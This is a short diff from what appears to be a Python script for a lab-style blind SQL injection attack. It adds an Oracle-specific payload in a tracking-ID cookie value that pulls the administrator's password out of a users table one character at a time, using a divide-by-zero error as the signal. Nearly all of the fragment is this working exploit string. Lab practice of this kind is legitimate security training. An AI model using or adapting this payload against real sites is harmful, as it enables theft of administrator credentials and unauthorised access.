@@ -4,6 +4,8 @@ from string import digits, ascii_letters, punctuation
 
 BASE_URL = ''
 PATH = ''
+
+# Oracle
 TRACKING_ID = "Kurf1degSkA9bO4C' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {char_no}, 1) = '{letter}') THEN NULL ELSE TO_CHAR(1/0) END FROM dual --"
 
 
